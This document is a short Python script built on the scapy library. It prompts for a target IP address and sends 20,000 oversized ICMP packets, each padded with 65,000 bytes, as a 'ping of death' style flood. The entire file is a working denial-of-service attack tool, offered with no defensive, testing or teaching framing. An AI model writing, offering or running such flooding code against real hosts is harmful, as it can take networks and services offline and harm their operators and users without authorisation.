from scapy.all import *
from scapy.packet import Raw

def flood():
    dst_ip = input("Enter in the IP to flood")
    raw = Raw(b"X"*65000)

    pingdeath = IP(dst=dst_ip)/ICMP()/raw
    send(pingdeath,count=20000,verbose=0)

flood()
    
